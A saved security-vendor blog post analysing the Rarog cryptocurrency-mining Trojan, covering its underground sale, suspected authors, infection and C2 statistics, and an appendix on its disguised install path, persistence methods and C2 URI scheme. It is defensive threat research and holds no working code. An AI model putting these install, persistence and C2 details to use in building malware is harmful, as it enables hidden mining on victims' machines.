    var referrer_domain = 'https://www.paloaltonetworks.com';
    sessionStorage.setItem("domain",referrer_domain);
    if(referer == 'Prisma'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/prismasearch";
        }
    if(referer == 'Cortex'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderCortex.cortexRenderer.html';	
        searchResultsPagePath = referrer_domain+"/search/cortexsearch";	
    }
    if(referer == 'Sase'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderSase.saseRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/sasesearch";
    }
    if(referer == 'Unit'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/content/pan/en_US/search/unit42search";
		    }
    if(referer == 'Ngfw'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/ngfw-cdss-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/search/ngfwcdsssearch";
    }
    httpGet(menu_url,'menu_html');
    document.getElementById('main-nav-menu-cont').removeAttribute("style");
}
function addStyle(styles) {            
    /* Create style document */
    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) 
        css.styleSheet.cssText = styles;
    else 
        css.appendChild(document.createTextNode(styles));

    /* Append style to the tag name */
    document.getElementsByTagName("head")[0].appendChild(css);
}
function httpGet(theUrl,req_type) {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            if(req_type == 'menu_html'){
            var nav_text = xmlhttp.responseText.replaceAll('https://static.cloud.coveo.com/searchui/v2.9159/js/CoveoJsSearch.Lazy.min.js', '');
            nav_text = nav_text.replaceAll('src="/', 'src="'+maindomain_lang+'/');
            nav_text = nav_text.replaceAll("'/content", "'"+maindomain_lang+"/content");
                        
            document.getElementById("PAN_2021_NAV_ASYNC").innerHTML = nav_text.replaceAll('href="/', 'href="'+maindomain_lang+'/');

            var lozad_back = document.getElementsByClassName('lozad-background');
            Array.prototype.forEach.call(lozad_back, function(el) {
            // Do stuff here
            var el_back_img_path = el.getAttribute('data-background-image');
            var first_pos = el_back_img_path.indexOf("'");
            var last_pos = el_back_img_path.indexOf("'",first_pos+1);
            el_back_img_path = el_back_img_path.substring(first_pos+1,last_pos);
            el.setAttribute("data-background-image",main_site_url+el_back_img_path);
            });
            }
            if(req_type == 'head_inline_css'){
            addStyle(xmlhttp.responseText);
            }
        }
    }
    xmlhttp.open("GET", theUrl, true );
    xmlhttp.send();    
}    
    
if(referer == 'Prisma' || referer == 'Cortex' || referer == 'Sase' || referer == 'Unit' || referer == 'Ngfw'){
    const article = document.querySelector('#PAN_2021_NAV_ASYNC');
    if(referer == 'Prisma'){
        article.dataset.type = 'prisma';
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    else if(referer == 'Cortex'){
        article.dataset.type = 'cortex';
    }
    else if(referer == 'Sase'){
        article.dataset.type = 'sase';
    }
    else if(referer == 'Unit'){
        article.dataset.type = 'unit';
    }
    else if(referer == 'Ngfw'){
        article.dataset.type = 'ngfw';
    }
    //set class to default
    if(referer == 'Unit' || referer == 'Ngfw'){
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    callMainSitePrismaNavHTML();        
}
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->



<main class="main">
    <section class="section section--article">
        <div class="pa article-banner" style="background-image:url('https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg')">
          <div class="l-container"> 
            <div class="l-breadcrumbs"> 
              <ul> <li> <a href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:breadcrumb:Threat Research">Threat Research Center</a></li><li><a href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" title="Threat Research" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:breadcrumb:Threat Research">Threat Research</a></li><li class="is-current"><a href="https://unit42.paloaltonetworks.com/category/malware/" role="link" title="Malware" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:breadcrumb:Malware">Malware</a></li> </ul>
            </div>            <div class="ab__title">
              <a class="card-category" href="https://unit42.paloaltonetworks.com/category/malware/" role="link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Malware"><span class="ab-title__pre">Malware</span></a> 
              <h1>Smoking Out the Rarog Cryptocurrency Mining Trojan</h1>
              <div class="ab__video">
              <span class="duration"> 
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg" alt="Clock Icon"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 12</span> <span class="rt-label rt-postfix"></span></span> min read              </span>
                              </div>          
              <div class="ab-lc__wrapper">
                <span class="ab-title__pre">Related Products</span><div class="ab__link-cards"><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/" style="--card-color: #ffcb06" role="link" title="Advanced WildFire" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Advanced WildFire"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png" alt="Advanced WildFire icon">Advanced WildFire</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/cortex-xdr/" style="--card-color: #00cc66" role="link" title="Cortex XDR" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Cortex XDR"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png" alt="Cortex XDR icon">Cortex XDR</a></div>              </div>
            </div>
          </div>
          <div class="ab__footer">
            <div class="l-container">
              <div class="ab__footer-wrapper">
                <ul class="ab__features" role="list">
                  <li role="listitem">
				 <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-profile-grey.svg" alt="Profile Icon">
					 <div class="ab__text"><span>By:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Unit 42" href="https://unit42.paloaltonetworks.com/author/unit42/">Unit 42</a></li></ul></div></li>                  <li role="listitem">
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-calendar-grey.svg" alt="Published Icon">
			<div class="ab__text"><span>Published:</span>April 4, 2018</div></li>					<li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-category.svg" alt="Tags Icon"><div class="ab__text"><span>Categories:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Cybercrime" href="https://unit42.paloaltonetworks.com/category/cybercrime/">Cybercrime</a></li><li><a data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Malware" href="https://unit42.paloaltonetworks.com/category/malware/">Malware</a></li><li><a data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Threat Research" href="https://unit42.paloaltonetworks.com/category/threat-research/">Threat Research</a></li></ul></div>
		</li>                  <li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-tags-grey.svg" alt="Tags Icon"><div class="ab__text"><span>Tags:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Cryptocurrency mining" href="https://unit42.paloaltonetworks.com/tag/cryptocurrency-mining/">Cryptocurrency mining</a></li><li><a data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Monero" href="https://unit42.paloaltonetworks.com/tag/monero/">Monero</a></li><li><a data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:Rarog" href="https://unit42.paloaltonetworks.com/tag/rarog/">Rarog</a></li></ul></div>
		</li>                </ul>
                <div class="ab__options">
                  <ul role="list">
                                        <li role="listitem"><a href="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/?pdf=download&#038;lg=en&#038;_wpnonce=66c883b287" role="link" target="_blank"  title="Click here to download" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:pdfdownload"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-download.svg" alt="Download Icon"></a></li>
                    <li role="listitem"><a href="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/?pdf=print&#038;lg=en&#038;_wpnonce=66c883b287" target="_blank" role="link" title="Click here to print" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:hero:pdfprint"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-print.svg" alt="Print Icon"></a></li>
                  </ul>
                  
	<div class="ab__share" id="shareDropdown" role="button" aria-expanded="false">
	<a href="#" role="link" title="Click here to share" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:share" class="">Share<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"></a><ul class="share-dropdown" role="menu">
				<li role="menuitem">
					<a href="#" class="copy-url" id="copyUrl" data-url="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/" role="link" title="Copy link" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:share:link"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg" alt="Link Icon"></a>
				</li>
				<li role="menuitem">
					<a href="mailto:?subject=Smoking%20Out%20the%20Rarog%20Cryptocurrency%20Mining%20Trojan&#038;body=Check%20out%20this%20article%20https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-smoking-rarog-mining-trojan%2F" role="link" title="Share in email" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:share:email"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg" alt="Link Email"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-smoking-rarog-mining-trojan%2F" target="_blank" role="link" title="Share in Facebook" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:share:facebook"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg" alt="Facebook Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-smoking-rarog-mining-trojan%2F&#038;title=Smoking%20Out%20the%20Rarog%20Cryptocurrency%20Mining%20Trojan" target="_blank" role="link" title="Share in LinkedIn" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:share:linkedin"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg" alt="LinkedIn Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-smoking-rarog-mining-trojan%2F&#038;text=Smoking%20Out%20the%20Rarog%20Cryptocurrency%20Mining%20Trojan" target="_blank" role="link" title="Share in Twitter" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:share:twitter"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg" alt="Twitter Icon"></a>
				</li>
				<li role="menuitem">
					<a href="//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-smoking-rarog-mining-trojan%2F" target="_blank" role="link" title="Share in Reddit" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:share:reddit"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg" alt="Reddit Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://mastodon.social/share?text=Smoking%20Out%20the%20Rarog%20Cryptocurrency%20Mining%20Trojan%20https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-smoking-rarog-mining-trojan%2F" target="_blank" role="link" title="Share in Mastodon" data-page-track="true" data-page-track-value="unit42-smoking-rarog-mining-trojan:share:mastodon"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg" alt="Mastodon Icon"></a>
				</li>
	  </ul>
    </div>                </div>
              </div>
            </div>
          </div>
        </div>
      </section> 
    <section class="section blog-contents"> 
      <div class="pa blog-editor">
        <div class="l-container">
          <div class="be__wrapper">
            <div class="be__contents">
              <div class="be__contents-wrapper">
                <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-smoking-rarog-mining-trojan/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p><img  class="size-full wp-image-70415 aligncenter lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_1.png" alt="rarog_1" width="560" height="587" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_1.png 560w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_1-286x300.png 286w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_1-370x388.png 370w" sizes="(max-width: 560px) 100vw, 560px" /><br />
For the past few months, Unit 42 researchers have investigated a relatively unknown coin mining Trojan that goes by the name ‘Rarog’.<br />
Rarog has been sold on various underground forums since June 2017 and has been used by countless criminals since then. To date, Palo Alto Networks has observed roughly 2,500 unique samples, connecting to 161 different command and control (C2) servers.<br />
Rarog has been seen primarily used to mine the <a href="https://en.wikipedia.org/wiki/Monero_(cryptocurrency)">Monero</a> cryptocurrency, however, it has the capability to mine others.  It comes equipped with a number of features, including providing mining statistics to users, configuring various processor loads for the running miner, the ability to infect USB devices, and the ability to load additional DLLs on the victim.<br />
Rarog is in line with the overall trends we’ve seen regarding the rapidly increasing use of cryptocurrency miners. Additionally, Rarog provides an affordable way for new criminals to gain entry into this particular type of malware.<br />
To date, we have confirmed over 166,000 Rarog-related infections worldwide. The majority of these occur in the Philippines, Russia, and Indonesia. While a large number of infections have been recorded by various criminals who have used this mining Trojan, we have seen very little recorded profits: the highest profits we have observed amount to roughly US $120.<br />
The Trojan itself is likely named after a “<a href="https://en.wikipedia.org/wiki/Rar%C3%B3g">Raróg</a>”, a fire demon that originates in Slavic mythology and is typically represented as a fiery falcon.<br />
&nbsp;<br />
<span style="font-size: 18pt;">Rarog on the Underground</span><br />
The Rarog Trojan originated on various Russian-speaking criminal underground sites in June 2017, as shown in the image below:<br />
<img  class="aligncenter wp-image-70454 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_2.png" alt="rarog_2" width="600" height="277" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_2.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_2-900x415.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_2-300x138.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_2-768x354.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_2-370x171.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 1 Posting in Russian underground forum for Rarog malware</em></p>
<p>The malware sells for 6,000 Rubles, or roughly US $104 at today’s exchange rates. Additionally, a guest administration panel is provided to allow potential buyers the chance to do a “test drive” by interacting with the interface. This interface may be seen below:<br />
<img  class="aligncenter wp-image-70493 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_3.png" alt="rarog_3" width="600" height="261" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_3.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_3-900x392.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_3-300x131.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_3-768x334.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_3-370x161.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 2 Rarog administration panel</em></p>
<p style="text-align: left;">Note the two Twitter handles shown in the administration panel above. The first handle, “arsenkooo135”, is the same handle used in various postings for this malware family, including the one shown in Figure 1. We observed the second handle, “foxovsky”, interacting with other security researchers online. We also tied this handle to a GitHub repository with the same handle that hosts various other malware families. Evidence suggests that these two individuals are the ones behind this threat.</p>
<p style="text-align: left;"><img  class="aligncenter wp-image-70532 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_4.png" alt="rarog_4" width="600" height="1323" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_4.png 670w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_4-136x300.png 136w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_4-465x1024.png 465w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_4-370x816.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 3 Foxovsky handle on Twitter interacting with security researchers regarding the Rarog malware family</em></p>
<p style="text-align: center;"><img  class="aligncenter wp-image-70571 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_5.png" alt="rarog_5" width="600" height="238" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_5.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_5-900x358.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_5-300x119.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_5-768x305.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_5-370x147.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 4 Foxovsky’s GitHub profile, hosting various malware families</em></p>
<p>Additionally, we have seen the “foxovsky” account on GitHub host the Rarog malware family on his or her GitHub account.<br />
&nbsp;<br />
<span style="font-size: 18pt;">Rarog Malware Family</span><br />
At a very high level, the Rarog Mining Trojan performs the following actions:<br />
<img  class="aligncenter wp-image-70610 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_6.png" alt="rarog_6" width="600" height="274" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_6.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_6-900x411.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_6-300x137.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_6-768x351.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_6-370x169.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 5 Rarog flow of execution</em></p>
<p>The malware comes equipped with a number of features. It uses multiple mechanisms to maintain persistence on the victim’s machine, including the use of the Run registry key, scheduled tasks, and shortcut links in the startup folder. At its core, Rarog is a coin mining Trojan and gives the attackers the ability to not only download mining software but configure it with any parameters they wish. They’re also able to easily throttle the mining software based on the victim machine’s characteristics.<br />
In addition to coin mining, Rarog also employs a number of botnet techniques. It allows the attackers to perform a number of actions, such as downloading and executing other malware, levying DDoS attacks against others, and updating the Trojan, to name a few. Throughout the malware’s execution, a number of HTTP requests are made to a remote C2 server. An overview of all of these URIs and their description may be found below:</p>
<table align="center">
<tbody>
<tr>
<td width="228"><strong>URI</strong></td>
<td width="396"><strong>Description</strong></td>
</tr>
<tr>
<td width="228">/2.0/method/checkConnection</td>
<td width="396">To ensure the remote server is responding as expected.</td>
</tr>
<tr>
<td width="228">/2.0/method/config</td>
<td width="396">Get arguments to supply to miner program.</td>
</tr>
<tr>
<td width="228">/2.0/method/delay</td>
<td width="396">Retrieve time to sleep before executing miner program.</td>
</tr>
<tr>
<td width="228">/2.0/method/error</td>
<td width="396">Retrieve information about error message to display to the victim.</td>
</tr>
<tr>
<td width="228">/2.0/method/get</td>
<td width="396">Get location of miner file based on CPU architecture of victim.</td>
</tr>
<tr>
<td width="228">/2.0/method/info</td>
<td width="396">Get exe name of miner program.</td>
</tr>
<tr>
<td width="228">/2.0/method/setOnline</td>
<td width="396">Update statistics for victim on C2 server.</td>
</tr>
<tr>
<td width="228">/2.0/method/update</td>
<td width="396">Used for updating the Rarog Trojan</td>
</tr>
<tr>
<td width="228">/4.0/method/blacklist</td>
<td width="396">Retrieve a list of process names to check against. Should any be running in the foreground, Rarog will suspend mining operations.</td>
</tr>
<tr>
<td width="228">/4.0/method/check</td>
<td width="396">Query remote C2 server to determine if ID exists.</td>
</tr>
<tr>
<td width="228">/4.0/method/cores</td>
<td width="396">Retrieve percentage of CPU to use on victim machines for mining.</td>
</tr>
<tr>
<td width="228">/4.0/method/installSuccess</td>
<td width="396">Query the C2 server for botnet instructions.</td>
</tr>
<tr>
<td width="228">/4.0/method/modules</td>
<td width="396">Retrieve third-party modules to load on victim.</td>
</tr>
<tr>
<td width="228">/4.0/method/threads</td>
<td width="396">Determine what tasks to run on the victim machine (USB spreading, helper executables, etc.)</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
For additional information on how the Rarog malware family operations, please refer to the <a href="#Appendix">Appendix</a>.<br />
&nbsp;<br />
<strong>Victim Telemetry</strong><br />
We identified a total of 161 C2 servers communicating with the Rarog malware family. A full list may be found in the <a href="#Appendix">Appendix.</a> Looking at the geographic distribution of these C2 servers, we see a high concentration of them located in Russia and Germany.<br />
<img  class="aligncenter wp-image-70649 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_7.png" alt="rarog_7" width="600" height="301" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_7.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_7-900x452.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_7-300x151.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_7-768x386.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_7-370x186.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 6 Distribution of C2 servers hosting Rarog malware</em></p>
<p>The distribution rate of new Rarog samples has varied in the past nine months, with a large spike occurring between late August to late September of 2017. At its peak, we encountered 187 unique Rarog samples during the week of September 11, 2017.<br />
&nbsp;<br />
<img  class="aligncenter wp-image-70688 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_8.png" alt="rarog_8" width="600" height="386" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_8.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_8-900x579.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_8-300x193.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_8-768x494.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_8-370x238.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 7 New Rarog malware samples encountered over time</em></p>
<p>These samples confirm at least 166,000 victims spread across the globe. While infections occur in most regions of the world, high concentrations occur in the Philippines, Russia, and Indonesia, as seen in the figure below:<br />
<img  class="aligncenter wp-image-70727 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_9.png" alt="rarog_9" width="600" height="272" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_9.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_9-900x407.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_9-300x136.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_9-768x348.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/rarog_9-370x168.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 8 Rarog infections across the globe</em></p>
<p>Rarog is able to provide telemetry those that have purchased it using the third-party MinerGate mining service. A number of MinerGate API keys were able to be retrieved, however, the profits made by these attackers were minimal at best. The most profitable attacker was found to generate roughly 0.58 Monero (XMR), and 54 ByteCoin (BCN). By today’s exchange rates, this amounts to $123.68 total. After factoring in the cost of the malware itself at $104, the attackers in question have generated very little income. In most cases, they’ve lost money.<br />
&nbsp;<br />
<span style="font-size: 18pt;">Ties to Previous Malware Families</span><br />
In late October 2017, Kaspersky <a href="https://securelist.com/tales-from-the-blockchain/82971/">wrote a blog post</a> about a malware family named ‘DiscordiaMiner’. In this blog post, they describe a cryptocurrency miner that shared a number of characteristics with Rarog. Upon further inspection, they mention the author of the program, who is none other than the previously mentioned “foxovsky” user. Indeed, when looking at this user’s GitHub account in Figure 4, we saw the source code to this mining Trojan. The last time the source code to this particular malware was updated was on May 25<sup>th</sup>, 2017.<br />
Looking at the source code to DiscordiaMiner, we see a large number of similarities with Rarog. So many in fact, that we might reach the conclusion that Rarog is an evolution of Discordia. Kaspersky’s blog post discussed some drama concerning this particular malware family on various underground forums. Accusations were made against the Trojan’s author with substituting customer’s cryptocurrency wallet addresses with his own. This dispute is what ultimately led foxovsky to open-source the DiscordiaMiner program on GitHub. The timeline of when Rarog was first advertised in June 2017, as well as the time DiscordiaMiner was last updated in May 2017, paints, and interesting picture. Based on this information, as well as the heavy code overlap made between the malware families, I suspect that foxovsky rebranded DiscordiaMiner to Rarog and continued development on this newly named malware family. This re-branding allowed him to get away from the negativity that was associated with DiscordiaMiner.<br />
&nbsp;<br />
<span style="font-size: 18pt;">Conclusion</span><br />
The Rarog malware family represents a continued trend toward the use of cryptocurrency miners and their demand on the criminal underground. While not incredibly sophisticated, Rarog provides an easy entry for many criminals into running a cryptocurrency mining botnet. The malware has remained relatively unknown for the past nine months barring a few exceptions. As the value of various cryptocurrencies continues to remain high, it is likely that we’ll continue to see additional malware families with mining functionality surface.<br />
Palo Alto Networks customers are protected against this threat in the following ways:</p>
<ul>
<li>All samples referenced in this blog post are appropriately marked as malicious in WildFire and Traps</li>
<li>All domains used as C2 servers for Rarog are flagged as malicious</li>
<li>Tracking of the Rarog malware family may be done through the AutoFocus <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Rarog">Rarog</a> tag</li>
</ul>
<p>&nbsp;</p>
<p id="Appendix"><span style="font-size: 18pt;">Appendix</span></p>
<p>&nbsp;<br />
<strong>Technical Malware Analysis</strong><br />
The file with the following properties was used to conduct this analysis:</p>
<table align="center">
<tbody>
<tr>
<td width="312">MD5</td>
<td width="312">15361551cb2f705f80e95cea6a2a7c04</td>
</tr>
<tr>
<td width="312">SHA1</td>
<td width="312">a388e464edeb8230adc955ed6a78540ed1433078</td>
</tr>
<tr>
<td width="312">SHA256</td>
<td width="312">73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a</td>
</tr>
<tr>
<td width="312">Compile Time</td>
<td width="312">2018-03-17 16:36:18 UTC</td>
</tr>
<tr>
<td width="312">PDB String</td>
<td width="312">D:\Work\_Rarog\Release\Rarog.pdb</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
When Rarog is initially executed, the malware will look for the existence of the following file:</p>
<ul>
<li>C:\ProgramData\MicrosoftCorporation\Windows\System32\Isass.exe</li>
</ul>
<p>In the event this file is missing on the system, Rarog will enter its installation routine, which is outlined below.<br />
&nbsp;<br />
<strong>Installation Routine</strong><br />
The installation routine begins by creating the following hidden directory path:</p>
<ul>
<li>C:\ProgramData\MicrosoftCorporation\Windows\System32\</li>
</ul>
<p>It then copies itself to the directory above with a filename of ‘Isass.exe’. This newly copied file is then executed in a new process. After this takes place, the malware makes a HTTP POST request as follows:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-676268260c9b4439471035" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
